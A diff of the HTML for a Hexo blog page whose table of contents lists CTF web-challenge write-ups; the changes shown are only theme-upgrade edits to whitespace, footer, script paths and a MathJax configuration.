+		<div class="page-title">寒假training-1</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%92%E5%81%87week-1"><span class="nav-text">寒假week 1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PwnThyBytes-2019-Baby-SQL"><span class="nav-text">[PwnThyBytes 2019]Baby_SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#very-easy-sql"><span class="nav-text">very_easy_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HFCTF-2021-Final-easyflask"><span class="nav-text">[HFCTF 2021 Final]easyflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CATCTF-wife-wife"><span class="nav-text">CATCTF wife_wife</span></a></li></ol></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -975,7 +870,7 @@
             
         </div>
         
-            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <script false src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
             <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                 
                     <span id="busuanzi_container_site_uv" class="lg:!block">
@@ -993,7 +888,7 @@
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.2</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
         </div>
         
         
@@ -1002,7 +897,7 @@
             </div>
         
         
-            <script data-swup-reload-script>
+            <script false>
                 try {
                     function odometer_init() {
                     const elements = document.querySelectorAll('.odometer');
@@ -1022,152 +917,113 @@
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-    </ul>
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/utils.js" type="module"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
-    });
-</script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-
-
-
-
-
-
-<script src="/js/tools/imageViewer.js" type="module"></script>
-
-<script src="/js/utils.js" type="module"></script>
-
-<script src="/js/main.js" type="module"></script>
-
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -1176,10 +1032,10 @@
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -1187,20 +1043,53 @@
 
 
 
-
-
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
-
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-</div>
+<script src="/js/build/libs/anime.min.js"></script>
 
 
-</body>
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+<!-- hexo injector body_end start -->
+<!-- MathJax 配置（Footer 注入版）-->
+<script>
+  window.MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      ignoreHtmlClass: "tex2jax_ignore",
+      processHtmlClass: "tex2jax_process"
+    }
+  };
+</script>
+<script id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+<!-- hexo injector body_end end --></body>
+
 </html>
